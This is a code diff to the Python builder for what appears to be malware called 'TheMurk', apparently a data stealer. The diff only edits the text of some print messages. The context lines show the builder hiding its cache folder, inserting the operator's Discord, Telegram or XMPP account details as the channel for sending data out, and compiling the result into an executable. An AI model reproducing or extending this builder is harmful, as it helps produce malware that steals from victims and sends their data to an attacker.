@@ -144,7 +144,7 @@ class Builder():
         shutil.move('buildingCache/',temp)
         win32api.SetFileAttributes(temp + os.sep + 'buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
         
-        print("\033[33m{}\033[0m".format("\n\n(i) Reading vars..."))
+        print("\033[33m{}\033[0m".format("(i) Reading vars..."))
         with open(temp + os.sep + 'buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/config/config.py', 'r') as f:
             data = f.read()
 
@@ -175,7 +175,7 @@ class Builder():
             data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 2")
             data = data.replace('xmppData = ["jabberid","jabberpassword","jabberreceiver"]',f'xmppData = ["{self.jabberid}","{self.jabberpassword}","{self.jabberreceiver}"]')
 
-        print("\033[33m{}\033[0m".format("\n\n(i) Writing vars..."))
+        print("\033[33m{}\033[0m".format("(i) Writing vars..."))
 
         with open(temp + os.sep + 'buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/config/config.py', 'w') as file:
             file.write(data)
@@ -184,7 +184,7 @@ class Builder():
         fullPath = fullPath.replace('\\Modules.zip', '')
 
         os.chdir(temp + os.sep + 'buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
-        print("\033[33m{}\033[0m".format("\n\n(i) Compiling..."))
+        print("\033[33m{}\033[0m".format("(i) Compiling..."))
         if self.builder == "Nuitka":
             self.time = 120
             os.system('start CompileNuitka.bat')
@@ -198,7 +198,7 @@ class Builder():
            pass
 
         if os.path.exists("TheMurk.exe") or os.path.exists("dist/TheMurk.exe"):
-            print("\033[33m{}\033[0m".format("\n\n(i) Ending..."))
+            print("\033[33m{}\033[0m".format("(i) Ending..."))
             time.sleep(60)
             os.chdir(f'{fullPath}')
             try:
